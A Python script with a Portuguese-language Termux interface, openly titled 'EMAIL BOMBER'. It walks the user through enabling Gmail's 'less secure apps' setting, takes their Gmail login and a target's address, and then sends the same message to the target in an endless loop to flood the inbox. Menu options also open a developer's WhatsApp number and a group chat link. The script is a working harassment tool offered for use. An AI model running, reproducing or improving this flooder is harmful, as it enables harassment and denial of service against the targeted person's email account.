import smtplib, os, pyfiglet, email.message
from time import sleep
global R,B,C,Y,G,RT,CY,CO
CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"
def clear():
	os.system('clear')
def ag():
	print(f'    {C}[{R}!{C}] ACESSANDO... NÃO INTERAJA COM O CELULAR\n    ATÉ ACESSARMOS O LINK! {C}[{R}!{C}]')
while True:
	clear()
	print(f'    {G}——— {C}[{R}*{C}] CODIFICADO POR: {G}Sweet Do Shock{C} [{R}*{C}]{G} ———\n')
	result = pyfiglet.figlet_format("   EMAIL\n BOMBER", font = "cosmic")
	print(f'''{C}{G}{result}''')
	print(f'    {C}[{R}!{C}] ATIVE A PERMISSÃO DE ACESSO A APPS MENOS SEGUROS{C} [{R}!{C}] \n')
	print(f'\n    {C}======================================')
	print(f'\n    {C}[{G}01{C}]{B} NÚMERO DO DESENVOLVEDOR ')
	print(f'    {C}[{G}02{C}]{B} MEU CHAT')
	print(f'    {C}[{G}03{C}]{B} ATIVAR ACESSO A APPS MENOS SEGUROS')
	print(f'\n    {C}======================================')
	print(f'\n\n    {C}[{R}!{C}] SE NÃO DESEJA NENHUMA DAS OPÇÕES ACIMA\n     DIGITE {G}X{C} PARA INICIAR O EMAILBOMBER [{R}!{C}]')
	
	choice = input(f'\n\n    {R}>>> {C}')
	
	if choice == '1':
		os.system('termux-open-url https://wa.me/5551997773672')
		ag()
		
	
	if choice == '2':
		os.system('termux-open-url https://chat.whatsapp.com/GA3Bgt5ifL55FsUC6o6ZHM')
		
		ag()
	
	if choice == '3':

		os.system('termux-open-url https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4OSggjYOgt8g8HbgSU58LpUqQ5GsD63ipENqa84YegMHionqqvIXMMoc4bqu-C0GH0N--Kal_AFpd5rRJYyO0g-y1AbEQ')
		ag()
	if choice == 'X':
		print(f'\n    {C}======================================')
		print(f'    {C}[{G}+{C}] INICIALIZANDO O EMAILBOMBER...')
		print(f'    {C}======================================\n')
		sleep(2)
		msg_flood =  input(f'    {C}[{G}+{C}] {G}MENSAGEM:{C} ')
		corpo_email = """
		{}
		""".format(msg_flood)
		title_flood = input(f'    {C}[{G}+{C}] {G}TITULO:{C} ')
		email_flood = input(f'    {C}[{G}+{C}] {G}SEU EMAIL:{C} ')
		senha_flood = input(f'    {C}[{G}+{C}]{G} SENHA:{C} ')
		email_alvo = input(f'    {C}[{G}+{C}] {G}EMAIL DO ALVO:{C} ')
		print(f'\n    {C}======================================')
		print(f'    {C}[{R}!{C}] SE A TOOL APRESENTAR ALGUM ERRO\n     OS DADOS INSERIDOS SÃO INVALIDOS {C}[{R}!{C}]')
		print(f'    {C}======================================')
		msg = email.message.Message()
		msg['Subject'] = "{}".format(title_flood)
		msg['From'] = '{}'.format(email_flood)
		msg['To'] = '{}'.format(email_alvo)
		password = '{}'.format(senha_flood)
		msg.add_header('Content-Type', 'text/html')
		msg.set_payload(corpo_email )
		s = smtplib.SMTP('smtp.gmail.com: 587')
		s.starttls()
		s.login(msg['From'], password)
		print(f'    {C}======================================')
		print(f'       {C}[{G}*{C}] {C}LOGIN EFETUADO COM {G}SUCESSO{C}!')
		print(f'    {C}======================================')
		while True:
			s.sendmail(msg['From'], [msg['To']],
			msg.as_string().encode('utf-8'))
			print(f'   {G}ENVIADO COM SUCESSO PARA{R}', email_alvo)